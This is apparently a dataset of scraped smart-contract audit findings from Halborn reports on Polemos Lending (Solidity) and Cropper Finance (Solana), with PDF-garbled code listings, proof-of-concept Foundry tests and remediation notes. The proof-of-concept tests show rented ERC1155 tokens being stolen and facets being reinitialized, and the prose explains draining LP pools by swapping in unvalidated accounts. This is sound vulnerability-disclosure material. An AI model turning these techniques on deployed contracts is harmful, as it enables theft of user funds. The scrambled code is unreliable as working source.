initializeRentalAutomator ( address ( mockUSDToken ) , domainName ); 77 78 79  test_diamond_proxy_initalizeAuthenticatedUpgradabilityModule_twice  () public { 80 81 82 83 84 85 vm . prank ( attacker1 ); vm . expectRevert ( bytes (\" AC -012 \")) ; RentalAutomatorFacet ( address ( rentalAutomatorProxy )) . temp [0] = address ( attacker1 ); temp [1] = address ( attacker2 ); temp [2] = address ( attacker3 ); function test_diamond_proxy_initializeRentalAutomator_twice () RentalAdminFacet ( address ( rentalAutomatorProxy )) . address [] memory temp = new address [](3) ; function (...) } } 49 } vm . prank ( attacker1 ); 86 87 RentalAuthenticatedUpgradabilityFacet ( address (  rentalAutomatorProxy )) . initalizeAuthenticatedUpgradabilityModule (  temp ); 88 89 90  public { 91 92  initializeRentalAdminFacet () ; 93 vm . prank ( attacker1 ); RentalAdminFacet ( address ( rentalAutomatorProxy )) . function test_diamond_proxy_initializeRentalAdminFacet_twice () } Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to turn on the isInitialized property within the initializeRentalAdminFacet() and initalizeAuthenticatedUpgradabilityModule () functions call. Remediation Plan: SOLVED: The Polemos team solved this issue in commit cf0d83cd8d859d41e0059954d2d9be1bd2a2dd7e: the initializeRentalAdminFacet () and initalizeAuthenticatedUpgradabilityModule() functions now turn on the isInitialized property. 50 ",
        "labels": [
            "Halborn",
            "Polemos_Lending",
            "Severity: Critical"
        ]
    },
    {
        "title": "TRANSFERFROMRENTALWALLET BYPASS FOR SAFETRANSFERFROM ERC1155 IS POSSIBLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The solution implements rental wallets that are under the custody of the Polemos team. Each rental wallet is assigned to each borrower individu- ally. After a successful asset claim, the rented asset is transferred to the rental wallet. Furthermore, the borrower can transfer owned tokens to the rental wallet. The borrower can manage the rental wallet off-chain, E.g., the however, the list of possible actions is strictly limited. borrower can transfer out any owned tokens from the rental wallet, but transferring the rented asset is forbidden. The transferFromRentalWallet () function is now available to the user, to manage owned and rental tokens within the rental wallet. struct. The assessment revealed that transferFromRentalWallet() with operation type set to SafeTransferFrom can be abused to steal ERC1155 rental tokens. The _applyErc1155Rules() function within the _checkPolicy() function only checks the first record of amounts collection from RentalPolicyArguments Thus, it does not check if more records were provided. Additionally, the transferFromRentalWalletERC1155() function performs _doERC1155Transfer() for every record of amounts and Ids collections for both SafeTransferFrom and SafeBatchTransferFrom operation types. These two implementation characteristics allow the attacker to provider mul- tiple records for amounts and Ids collections and force transfer of the rental tokens. 51 Code Location: Listing 12: LibRentalPolicyCheck.sol (Lines 186-193) 165 function _applyErc1155Rules ( 166 167 168 169 170 171 172 OperationType erc1155Operation , uint256 [] memory rentalWalletTotalBalances , uint256 [] memory rentalWalletClaimedBalances , RentalPolicyArguments memory args , address automatorAddress ) private pure returns ( RentalCheckResult memory ) { // method \" set - approval - for - all \" is prohibited , unless  operator is the Automator 173 if ( erc1155Operation == OperationType .  SetApprovalForAll_Erc1155 ) { 174 if ( args . operatorOrSpender == automatorAddress && args  . approved ) { 175 176 return RentalCheckResult ( true ,  PolicyCheckResponseCode . Checked_When_Erc1155_Operation ); 177 178 179 180 181 } return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 182 183 184 185 ); } // this is required to return the most accurate result in  case of safe - transfer operation 186 if ( erc1155Operation == OperationType .  SafeTransferFrom_Erc1155 ) { 187 188 189 190 191 192 193 194 195 196  ( 197 return _checkErc1155Transfer ( rentalWalletTotalBalances [0] , rentalWalletClaimedBalances [0] , args . amounts [0] ); } for ( uint256 i ; i < args . tokenIds . length ; i ++) { RentalCheckResult memory check = _checkErc1155Transfer rentalWalletTotalBalances [ i ], 52 198 199 200 201 202 rentalWalletClaimedBalances [i ], args . amounts [ i] ); // if there is not_checked result , then we should  break the cycle and return with suitable result 203 if ( check . resultCode == PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation ) { 204 205 206 207 return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 208 209 210 211 212 213 214 ); } } return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens 215 216 } ); Listing 13: LibRentalTransferUtils.sol 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 function transferFromRentalWalletERC1155 ( address tokenContract , address from , address to , uint256 [] memory amounts , uint256 [] memory tokenIds ) internal { // note : real batch - transfer not supported IERC1155 assetContract = IERC1155 ( tokenContract ); for ( uint i; i < amounts . length ; ++ i) { _doERC1155Transfer ( assetContract , from , to , tokenIds [ i ], amounts [i ], DEFAULT_ERC1155_OWNERSHIP_ERR , DEFAULT_ERC1155_APPROVAL_ERR 53 121 122 123 ); } } Proof of Concept: unit test confirms below transferFromRentalWallet() The triggering of possibility the with multiple the entries RentalPolicyArguments.amounts and RentalPolicyArguments.tokenIds collections and operation type set to SafeTransferFrom that results in all tokens transfers. the in Listing 14: HalbornERC1155CheckPolicyTest.t.sol claimAssetFromLenderToBorrowerERC1155 () ; vm . prank ( borrower1 ); mockErc1155Token . setApprovalForAll ( address ( uint256 [] memory Ids = new uint256 [](2) ; uint256 [] memory ammounts = new uint256 [](2) ; Ids [0] = 2; ammounts [0] = 0; Ids [1] = 1; ammounts [1] = 10; 1 function  test_transferFromRentalWallet_SafeTransferFrom_ERC1155_bypass ()  public { 2 3 4 5  rentalAutomatorProxy ) , true ); 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 TRANSFER_FROM_RENTAL_TYPEHASH , mockErc1155Token , borrower1 , borrowerExternal1 , keccak256 ( abi . encodePacked ( Ids )) , keccak256 ( abi . encodePacked ( ammounts )) , rentalAutomatorProxy , // params . operatorOrSpender , true , // params . approved , bytes32 structHash = keccak256 ( abi . encode ( 54 ) ); bytes32 domainSeparator = rentalRecoverable . bytes memory signature = abi . encodePacked (r ,s , v); RentalPolicyArguments memory rentalPolicyArguments = bytes32 readyForSigningHash = Hasher . hashTypedDataV4 ( ( uint8 v , bytes32 r , bytes32 s) = vm . sign ( ownerPrivateKey , address (0) , // params . verifyingContract , uint256 ( OperationType . SafeTransferFrom_Erc1155 ) , 0, keccak256 ( bytes ( TRANSFER_FROM_RENTAL )) 25 26 27 28 29 30 31 32  buildDomainSeparator ( domainName , VERSION , address (  rentalAutomatorProxy )) ; 33  structHash , domainSeparator ); 34 35  readyForSigningHash ); 36 37 38  RentalPolicyArguments ( 39 40 41 42 43 44 45 46 47 48 49 50 51 52  0) ; 53  0) ; 54 55 56  RentalAutomatorFacet ( address ( rentalAutomatorProxy )).  transferFromRentalWallet ( rentalPolicyArguments , AssetType . EIP1155 ,  0, signature ); 57 58 address ( mockErc1155Token ) , Ids , borrower1 , borrowerExternal1 , ammounts , address ( rentalAutomatorProxy ) , true , address (0) , OperationType . SafeTransferFrom_Erc1155 assertEq ( mockErc1155Token . balanceOf ( borrower1 , 1) , 10) ; assertEq ( mockErc1155Token . balanceOf ( borrower1 , 2) , 0) ; assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 1) , vm . prank ( borrower1 ); ( RentalCheckResult memory rentalCheckResult ) = assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 2) , assertEq ( rentalCheckResult . success , true ); ); 55 assertEq ( uint ( rentalCheckResult . resultCode ) , uint ( 59  PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens )); 60 61 62 63  10) ; 64  0) ; 65 } assertEq ( mockErc1155Token . balanceOf ( borrower1 , 1) , 0) ; assertEq ( mockErc1155Token . balanceOf ( borrower1 , 2) , 0) ; assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 1) , assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 2) , Risk Level: Likelihood - 5 Impact - 5 Recommendation: is for It recommended _applyErc1155Rules() functions used within the transferFromRentalWallet() function for operation type set to SafeTransferFrom apply strict transferFromRentalWalletERC1155() validation to and rules more Remediation Plan: SOLVED: The Polemos team solved this issue in commit e8b6e08011c7f0985a64972deeb0d95c29e88cdf: () function is now supporting two different functions: - safeTransferFromRentalWalletERC1155(), - safeBatchTransferFromRentalWalletERC1155(), for transferring ERC1155 tokens basing on operation type. the transferFromRentalWallet 56 ",
        "labels": [
            "Halborn",
            "Polemos_Lending",
            "Severity: Critical"
        ]
    },
    {
        "title": "CHECKPOLICY REVERTS FOR APPROVE ERC20 OPERATION TYPE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The solution implements rental wallets that are under the custody of the Polemos team. Each rental wallet is assigned to each borrower individ- ually. After a successful asset claim, the rented asset is transferred to the rental wallet. Furthermore, the borrower can transfer owned to- The borrower can manage the rental wallet kens to the rental wallet. off-chain, however, the list of possible actions is strictly limited. E.g. the borrower can transfer out any owned tokens from the rental wallet, but transferring the rented asset is forbidden. To check which action is allowed or prohibited, in before any action, the solution calls the checkPolicy() function from RentalAutomator. The checkPolicy() makes necessary checks, including the rental wallet tokens balances and rental balances from RentedStats structure, to decide e.g. if a transfer of only owned tokens is allowed, and returns RentalCheckResult and emits RentalPolicyChecked event. Basing on the result and event emitted, the solution can decide about triggering the transfer. The checkPolicy() function with the Approve_Erc20 operation type is called prior to increasing the allowance for the rental automator contract. This process is done before calling the returnAsset() function that transfers the rental assets from the rental wallet to the lender. However, the assessment revealed that it is not possible to call the checkPolicy() function with the Approve_Erc20 operation type, as it reverts in every case. Firstly, the function calls _preparePolicyCheckData() that returns two empty collections for the Approve_Erc20 operation type. Then these collections do not pass require assertion in _applyRules() as they have no single record required. As a result, the solution cannot return rental assets to the lender automatically. The approval process must be done then manually. 57 Code Location: Listing 15: RentalAutomator.sol (Lines 700,706,710) 693 function _preparePolicyCheckData ( 694 695 696 697 698 699 address rentalWallet , uint256 [] memory tokenIds , address tokenContract , AssetType assetType , OperationType operation ) private view returns ( uint256 [] memory totalBalances ,  uint256 [] memory claimedBalances ) { 700 701 702 703 704 705  || 706 707 708 if ( ) { ( operation >= OperationType . TransferNativeCoin && operation <= OperationType . SignTypedData ) || operation == OperationType . Unknown || operation == OperationType . SetApprovalForAll_Erc721 || operation == OperationType . SetApprovalForAll_Erc1155 operation == OperationType . Approve_Erc20 // note : do not check balances when operation is  related to erc_20_approve , set_approve_for_all 709 // or to non - token operations and , therefore , return  two empty arrays 710 711 712 713 return ( totalBalances , claimedBalances ); } // note : validate at this point only that tokenIds . length  is greater than zero 714 require ( tokenIds . length > 0,  TOKEN_IDS_ARRAY_LENGTH_IS_ZERO_ERR ); 715 716 717 718 719 720 721 722 723 724 725 726 727 totalBalances = new uint256 []( tokenIds . length ); claimedBalances = new uint256 []( tokenIds . length ); for ( uint256 i = 0; i < tokenIds . length ; i ++) { claimedBalances [ i ] = _getRentedAssetRecord ( assetType , rentalWallet , tokenContract , tokenIds [ i ] ); totalBalances [ i] = assetHandler . getBalance ( assetType , rentalWallet , 58 tokenContract , tokenIds [ i ] 728 729 730 731 732 ); } } Listing 16: LibRentalPolicyCheck.sol (Lines 52-55) ) private pure returns ( RentalCheckResult memory res ) { res = RentalCheckResult ( false , PolicyCheckResponseCode . if ( operation == OperationType . Unknown ) { return _appplyUknownOperationRules ( operation ); OperationType operation , uint256 [] memory rentalWalletTotalBalances , uint256 [] memory rentalWalletClaimedBalances , RentalPolicyArguments memory args , address automatorAddress } if ( 29 function _applyRules ( 30 31 32 33 34 35 36  Not_Checked ); 37 38 39 40 41 42 43 44 45 46  automatorAddress ); 47 } 48 49  <= OperationType . Approve_Erc20 ) { 50  strictly trying 51  ; it also means that empty arrays not allowed 52 53  rentalWalletClaimedBalances . length == 1 , 54 55 56 57 58 _applyErc20Rules ( operation , TOKEN_IDS_ARRAY_LENGTH_ERR ); return require ( ) { operation >= OperationType . TransferNativeCoin && operation <= OperationType . SignTypedData return _applyGeneralCallRules ( operation , args , rentalWalletTotalBalances . length == 1 && // note : validating at this point that the caller // to operate with a single token in case erc20 checks if ( operation >= OperationType . Transfer_Erc20 && operation 59 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 rentalWalletTotalBalances [0] , rentalWalletClaimedBalances [0] , args , automatorAddress ); } if ( ) { } if ( ) { operation >= OperationType . TransferFrom_Erc721 && operation <= OperationType . SetApprovalForAll_Erc721 return _applyErc721Rules ( operation , rentalWalletTotalBalances , rentalWalletClaimedBalances , args , automatorAddress ); operation >= OperationType . SafeTransferFrom_Erc1155 && operation <= OperationType . SetApprovalForAll_Erc1155 return _applyErc1155Rules ( operation , rentalWalletTotalBalances , rentalWalletClaimedBalances , args , automatorAddress ); } revert ( UNKNOWN_RENTAL_OPERATION_TYPE ); } Proof of Concept: below The unit Approve_Erc20 operation type. tests confirm the checkPolicy() reverts for the 60 Listing 17: HalbornERC20CheckPolicyTest.t.sol claimAssetFromLenderToBorrowerERC20 () ; function test_checkPolicy_ERC20_Approve_reverts () public { uint256 [] memory Ids = new uint256 [](1) ; uint256 [] memory ammounts = new uint256 [](1) ; Ids [0] = 0; ammounts [0] = 0; RentalPolicyArguments memory rentalPolicyArguments = 1 2 3 4 5 6 7 8  RentalPolicyArguments ( 9 10 11 12 13 14 15 16 17 18 19 20 vm . prank ( borrower1 ); 21 ( RentalCheckResult memory rentalCheckResult ) =  rentalAutomator . checkPolicy ( rentalPolicyArguments , AssetType . EIP20  ); 22 23  PolicyCheckResponseCode . Checked_When_Erc20_Operation )) ; 24 address ( mockErc20Token ) , Ids , borrower1 , borrowerExternal1 , ammounts , address ( rentalAutomator ) , true , address (0) , OperationType . Approve_Erc20 assertEq ( rentalCheckResult . success , true ); assertEq ( uint ( rentalCheckResult . resultCode ) , uint ( ); } 61 Risk Level: Likelihood - 5 Impact - 2 Recommendation: It is recommended to change assertions within the _applyRules() function to enable the checkPolicy() function with the Approve_Erc20 operation type. Remediation Plan: SOLVED: The Polemos team solved this issue in commit e8b6e08011c7f0985a64972deeb0d95c29e88cdf, checkPolicy() operation type. properly function works with now branch:halborn3: the Approve_Erc20 the 62 ",
        "labels": [
            "Halborn",
            "Polemos_Lending",
            "Severity: Medium"
        ]
    },
    {
        "title": "VALID SIGNATURE CAN BE REJECTED DUE TO INTEGER UNDERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Lending solutions uses EIP-712 based signatures for authorization. Within the data used for hashing and signing, the timestamp property is given among the others. The valid period for the timestamp property is between block.timestamp - 600s and block.timestamp + 9s. However, for the timestamp property set between block.timestamp + 1s and block. timestamp + 9s the validateSignatureTimestamp() function reverts due to integer underflow. As a result, there is a 9 seconds time window, where a valid signature can be rejected by the validation algorithm. This finding is related to both Rental and Scholar solutions. Code Location: Listing 18: LibRentalParamValidator.sol (Line 108) 102 function validateSignatureTimestamp ( uint256 timestamp )  internal view { 103 104 105 /* solhint - disable - next - line not - rely - on - time */ uint256 blockTimestamp = block . timestamp ; uint256 timestampWithTreshold = blockTimestamp +  SIGNATURE_TIMESTAMP_FUTURE_TRESHOLD ; 106 require ( timestamp < timestampWithTreshold ,  SIGNATURE_TIMESTAMP_IN_FUTURE_ERR ); 107 108 require ( blockTimestamp - timestamp <=  SIGNATURE_VALIDITY_PERIOD , 109 110 111 ); } SIGNATURE_VALIDITY_PERIOD_ERR 63 Listing 19: LibScholarParamValidator.sol (Line 86) function validateSignatureTimestamp ( uint256 timestamp ) /* solhint - disable - next - line not - rely - on - time */ uint256 blockTimestamp = block . timestamp ; uint256 timestampWithTreshold = blockTimestamp + require ( timestamp < timestampWithTreshold , 80  internal view { 81 82 83  SIGNATURE_TIMESTAMP_FUTURE_TRESHOLD ; 84  SIGNATURE_TIMESTAMP_IN_FUTURE_ERR ); 85 86  SIGNATURE_VALIDITY_PERIOD , 87 88 89 require ( ); } blockTimestamp - timestamp <= SIGNATURE_VALIDITY_PERIOD_ERR Proof of Concept: 1. All necessary contracts are deployed, including RentalRecoverable, RentalAssetHandler, RentalPolicyHandler, RentalAutomator. 2. As administrator, calculate signature for SetFeeAddressParams structure. SIGNATURE_TIMESTAMP_FUTURE_TRESHOLD - 1 as value. For the timestamp property, set block.timestamp + 3. As administrator, attempt to call the setFeeAddress() function. 4. Observe the transaction reverts due to Arithmetic over/underflow error. Risk Level: Likelihood - 1 Impact - 5 64 Recommendation: It is recommended to add a condition check in the validateSignatureTimestamp () function to prevent integer underflow. Remediation Plan: SOLVED: The Polemos team solved this issue in commit 8983dfaea6c16b11236fe576efe13805c9e74e84: the validateSignatureTimestamp () function now implements additional condition check preventing integer underflow. 65 ",
        "labels": [
            "Halborn",
            "Polemos_Lending",
            "Severity: Medium"
        ]
    },
    {
        "title": "AUTHENTICATED UPGRADEABILITY FACET IS NOT INDEPENDENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "or the replace Lending solution implements upgradability The with diamond proxy. The DiamondCut functionality that allows to add, remove is the the RentalAuthenticatedUpgradabilityFacet contract. This contract also The assessment revealed that implements quorum-based authorization. this facet makes use of functionalities defined in other facets; thus it is not independent. It depends on three components: implemented diamonds pattern facet in  it uses getDomainSeparator() the Eip712ConfigFacet contract (inherited by the RentalAutomatorFacet contract), defined which in is  it uses the recoverReplaceAdminApprove() function which is defined in RentalRecoverableFacet.  _initEip712Config() initialize function must be called in prior to initializing domain separator, otherwise the getDomainSeparator() returns 0x0. Assuming that there is no issue within the deployment procedure, some of these functions might be either removed or replaced (in terms of both function signature and implementation) while doing an update. In such a situation, the AuthenticatedUpgradabilityFacet functionalities will not be usable anymore, and the proxy will lose the possibility to make further upgrades. The same weakness is applicable for the ScholarAuthenticatedUpgradabilityFacet . 66 Code Location: Listing 88,127,161,218,84,123,157,202,215) 20: RentalAuthenticatedUpgradabilityFacet.sol (Lines for ( uint8 i ; i < length ; ++ i ) { address currentAdmin = recoverable () . AdminData memory currentData = adminDatas [ i ]; validateSignatureTimestamp ( currentData . timestamp ); address [] memory signatories = new address []( length ); uint8 length = uint8 ( adminDatas . length ); _validateParamsLength ( length ); params , currentData , ADD_MODULES , eip712Config () . getDomainSeparator () 73 function addModules ( AddModulesParams memory params , AdminData []  memory adminDatas ) external { 74 75 76 77 78 79 80 81 82 83 84  recoverSignatoryAddModules ( 85 86 87 88 89 90  USER_NOT_ADMIN_ERR ); 91 92 93 94 95  DUPLICATED_ADMIN_SIGNATORIES_ERR ); 96 97 98 99 100 101 102 103 104 105 106 107 FacetCut [] memory facetCut = new FacetCut [](1) ; facetCut [0] = FacetCut ( params . facetAddress , FacetCutAction . Add , params . selectors , params . initData ); _validateAdminAddressWithErr ( currentAdmin , _validateListContainsUniqueItemsWithErr ( signatories , ); diamondCut ( facetCut ); emit AddModules ( params , adminDatas ); signatories [i ] = currentAdmin ; } } 67 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 function removeModules ( RemoveModulesParams memory params , AdminData [] memory adminDatas ) external { uint8 length = uint8 ( adminDatas . length ); _validateParamsLength ( length ); address [] memory signatories = new address []( length ); for ( uint8 i ; i < length - 1; ++ i) { AdminData memory currentData = adminDatas [ i ]; validateSignatureTimestamp ( currentData . timestamp ); address currentAdmin = recoverable () .  recoverSignatoryRemoveModules ( 124 125 126 127 128 129 params , currentData , REMOVE_MODULES , eip712Config () . getDomainSeparator () ); _validateAdminAddressWithErr ( currentAdmin ,  USER_NOT_ADMIN_ERR ); 130 131 132 133 134 signatories [i ] = currentAdmin ; } _validateListContainsUniqueItemsWithErr ( signatories ,  DUPLICATED_ADMIN_SIGNATORIES_ERR ); 135 136 137 FacetCut [] memory facetCut = new FacetCut [](1) ; facetCut [0] = FacetCut ( params . facetAddress , FacetCutAction  . Remove , params . selectors , hex \" \" ); 138 139 140 141 142 143 144 145 146 147 diamondCut ( facetCut ); emit RemoveModules ( params , adminDatas ); } function replaceModules ( ReplaceModulesParams memory params , AdminData [] memory adminDatas ) external { uint8 length = uint8 ( adminDatas . length ); 68 148 149 150 151 152 153 154 155 156 157 _validateParamsLength ( length ); address [] memory signatories = new address []( length ); for ( uint8 i ; i < length - 1; ++ i) { AdminData memory currentData = adminDatas [ i ]; validateSignatureTimestamp ( currentData . timestamp ); address currentAdmin = recoverable () .  recoverSignatoryReplaceModules ( 158 159 160 161 162 163 params , currentData , REPLACE_MODULES , eip712Config () . getDomainSeparator () ); _validateAdminAddressWithErr ( currentAdmin ,  USER_NOT_ADMIN_ERR ); 164 165 166 167 168 signatories [i ] = currentAdmin ; } _validateListContainsUniqueItemsWithErr ( signatories ,  DUPLICATED_ADMIN_SIGNATORIES_ERR ); 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 FacetCut [] memory facetCut = new FacetCut [](1) ; facetCut [0] = FacetCut ( params . facetAddress , FacetCutAction . Replace , params . selectors , params . initData ); diamondCut ( facetCut ); emit ReplaceModules ( params , adminDatas ); } function replaceAdmin ( ReplaceAdminApproveParams memory approveParams , AdminData [] memory adminDatas , ReplaceAdminConfirmParams memory confirmParams ) external { require ( approveParams . nonce == confirmParams . nonce ,  NONCE_MISMATCH_ERR ); 69 188 189 190 191 192 193 194 DiamondStorage storage ds = state () ; uint8 length = uint8 ( adminDatas . length ); _validateParamsLength ( length ); address [] memory signatories = new address []( length ); _validateAdminAddressWithErr ( confirmParams .  currentAdminAddress , USER_NOT_OLD_ADMIN_ERR ); 195 196 197 198 199 200 201 202 validateSignatureTimestamp ( confirmParams . timestamp ); for ( uint8 i ; i < length - 1; ++ i) { AdminData memory currentData = adminDatas [ i ]; validateSignatureTimestamp ( currentData . timestamp ); address currentAdmin = recoverable () .  recoverReplaceAdminApprove ( 203 204 205 206 207 208 approveParams , currentData , REPLACE_ADMIN_APPROVE , eip712Config () . getDomainSeparator () ); _validateAdminAddressWithErr ( currentAdmin ,  USER_NOT_ADMIN_ERR ); 209 210 211 212 213 signatories [i ] = currentAdmin ; } _validateListContainsUniqueItemsWithErr ( signatories ,  DUPLICATED_ADMIN_SIGNATORIES_ERR ); 214 215 address newAdmin = recoverable () .  recoverReplaceAdminConfirm ( 216 217 218 219 220 221 222 223 224 225  false ; confirmParams , REPLACE_ADMIN_CONFIRM , eip712Config () . getDomainSeparator () ); require ( newAdmin == approveParams . newAdminAddress , SIGNATORY_NOT_NEW_UPGRADABILITY_ADMIN_ERR ); ds . adminList . _isAdmin [ approveParams . currentAdminAddress ] = 70 226 ds . adminList . _isAdmin [ approveParams . newAdminAddress ] =  true ; 227  ); 228 } emit ReplaceAdmin ( approveParams , confirmParams , adminDatas Listing 21: RentalAuthenticatedUpgradabilityFacet.sol 253 function recoverable () private view returns (  IRentalRecoverable instance ) { 254 255 256 257 instance = IRentalRecoverable ( address ( this )) ; } function eip712Config () private view returns ( IBaseEip712  instance ) { 258 259 } instance = IBaseEip712 ( address ( this )); Proof of Concept: 1. Deploy RentalAutomatorProxy proxy with two facets only: RentalAuthenticatedUpgradabilityFacet and RentalAutomatorFacet. 2. Initialize the RentalAuthenticatedUpgradabilityFacet. 3. Attempt to call replaceAdmin() function. Observe that proxy attempts to call recoverReplaceAdminApprove() function and reverts with U -002: FUNCTION_NOT_EXISTS_ERR error. 71 Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is recommended to make the RentalAuthenticatedUpgradabilityFacet facet independent of other facets, so its functionality is immune to undesired effects of other facets upgrades. Remediation Plan: SOLVED: The Polemos team solved this issue in commit 8816106151438db93aac410b04a142e3b55d32ea: the RentalAuthenticatedUpgradabilityFacet facet is now independent of other facets. 72 ",
        "labels": [
            "Halborn",
            "Polemos_Lending",
            "Severity: Medium"
        ]
    },
    {
        "title": "DIAMOND PROXY DOES NOT SET THE ESSENTIAL VARIABLES IN THE CONSTRUCTOR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "the Lending pattern solution implements upgradeability The by The RentalAutomatorProxy proxy accepts an array of diamond proxy. FacetCutWithoutInitData as input parameter, and then it registers all the provided facets. However, it does not initialize any of these facets (by custom implementation). Thus, between the proxys constructor call and the facets initializing function call, the solution remains unprotected. In this window, an attacker can attempt front-running the initializing function call. Alternatively, some facets might be uninitialized due to human error. The reference implementation diamond-2-hardhat sets the contract owner in the constructor, whereas in this case, the solution admin is set in the late RentalAdminFacets initializeRentalAdminFacet() function call. Also, all identified initialize functions lack any sort of authorization. The same weakness was identified in the ScholarAutomatorProxy contract. Code Location: Listing 22: RentalAutomatorProxy.sol FacetCut [] memory cutWithInitData = new FacetCut []( cut . for ( uint256 facetIndex ; facetIndex < cut . length ; ) { 17 constructor ( FacetCutWithoutInitData [] memory cut ) { 18  length ); 19 20 21 22 23 24 25 26 cut [ facetIndex ]. facetAddress , cut [ facetIndex ]. action , cut [ facetIndex ]. functionSelectors , hex \" \" cutWithInitData [ facetIndex ] = FacetCut ( ); 73 27 28 29 30 31 32 33 34 } unchecked { facetIndex ++; } } LibDiamond . diamondCut ( cutWithInitData ); _setSupportedInterfacesByDefault () ; Risk Level: Likelihood - 1 Impact - 5 Recommendation: is It recommended set contract RentalAutomatorProxy ize functions can be protected. to the essential so constructor, variables the that in the initial- Remediation Plan: RISK ACCEPTED: The Polemos team accepted the risk of this finding. Instead of setting the aforementioned variables in the constructor, the deployment script is going to handle the deployment and initialize functionality. Then, a manual process of verification will be executed. 74 3.10 (HAL-10) STAKE ASSET LACKS TOKENS WHITELISTING - LOW ",
        "labels": [
            "Halborn",
            "Polemos_Lending",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING ACCOUNT VALIDATION LEADS TO MULTIPLE CRITICAL VULNERABILITIES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Cropper Farm program allows users to deposit LP tokens in farms and harvest rewards based on the deposit they made. Each farm is owned by an authority account which controls the farms LP token pool and the reward token pool. This authority is a PDA derived from the farm account address and the farm program ID. Whenever a user sends a transaction to the program they have to provide a number of account addresses, the most interesting of them being: 1. source token account address 2. destination token account address 3. transfer authority account address 4. fee account address All token transfers are handled by the token_transfer function defined in processor.rs. token_transfer signs all transactions with the farms authority account (the PDA) by default and uses the invoke_signed function to call the SPL Token programs process_transfer function to transfer the tokens. The invoke_signed function appends the programs signature to the transaction signers array. Because neither deposit nor withdraw functions validate addresses and ownership of the user-supplied accounts, a number of critical vulnera- bilities can be identified in the program, including: 13 1. Stealing all LP tokens in all pools A malicious user may send a Deposit, Withdraw or an AddReward instruction and replace his transfer authority account address with the farm authority account address, the source LP token account with the farms LP token account and the destination LP token account with their own account to transfer all tokens from the farm pool account to the users account. This is because the source token address is not validated not to be equal to the farm pools account address 2. Stealing handling fees A malicious user may send a PayFarmFee, Deposit or Withdraw instruction and replace the fee account address with their own account address to transfer the fee back to themselves. The program will confirm the fee has been paid successully and will keep processing the instruction logic. This is because the user-supplied fee account address is not validated to match the intended one. Code Location: Listing 1: processor.rs (Lines 782,787,788,793,800) 776 // / issue a spl_token ` Transfer ` instruction . 777 pub fn token_transfer < 'a >( pool : & Pubkey , 778 token_program : AccountInfo < 'a >, 779 source : AccountInfo <'a >, 780 destination : AccountInfo < 'a >, 781 authority : AccountInfo <'a >, 782 nonce : u8 , 783 amount : u64 , 784 785 ) -> Result <() , ProgramError > { 786 787 788 789 let pool_bytes = pool . to_bytes () ; let authority_signature_seeds = [& pool_bytes [..32] , &[ nonce ]]; let signers = &[& authority_signature_seeds [..]]; let ix = spl_token :: instruction :: transfer ( 14 790 791 792 793 794 795 796 797 798 799 800 801 802 } token_program . key , source . key , destination . key , authority . key , &[] , amount , ) ?; invoke_signed ( & ix , &[ source , destination , authority , token_program ], signers , ) 15 Examples of missing account validation in process.rs. Listing 2: process.rs 256 // authority information of this farm account 257 let authority_info = next_account_info ( account_info_iter ) ?; 258 259 // depositor 's wallet account information 260 let depositor_info = next_account_info ( account_info_iter ) ?; 261 262 // depositor 's user account information to include deposited balance , reward debt 263 let user_info_account_info = next_account_info ( account_info_iter ) ?; 264 265 // depositor 's transfer authority ( wallet address ) 266 let user_transfer_authority_info = next_account_info ( account_info_iter ) ?; 267 268 // lp token account information in the depositor ' s wallet 269 let user_lp_token_account_info = next_account_info ( account_info_iter ) ?; 270 271 // lp token account information in the farm pool 272 let pool_lp_token_account_info = next_account_info ( account_info_iter ) ?; 273 274 // reward token account information in the depositor ' s wallet 275 let user_reward_token_account_info = next_account_info ( account_info_iter ) ?; 276 277 // reward token account information in the farm pool 278 let pool_reward_token_account_info = next_account_info ( account_info_iter ) ?; 16 Harvesting rewards, paying the fee and depositing tokens. Listing 3: processor.rs (Lines 350,364,378,379,380) 335 // harvest user 's pending rewards 336 if user_info . deposit_balance > 0 { 337 338 339 340 341 342 343 if pending > 0 { // pending amount let pending : u64 = farm_pool . pending_rewards (& mut user_info ); // harvest fee for the pending reward let harvest_fee = pending * HARVEST_FEE_NUMERATOR / 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 HARVEST_FEE_DENOMINATOR ; // transfer harvest fee to fee owner Self :: token_transfer ( farm_id_info . key , token_program_info . clone () , pool_reward_token_account_info . clone () , 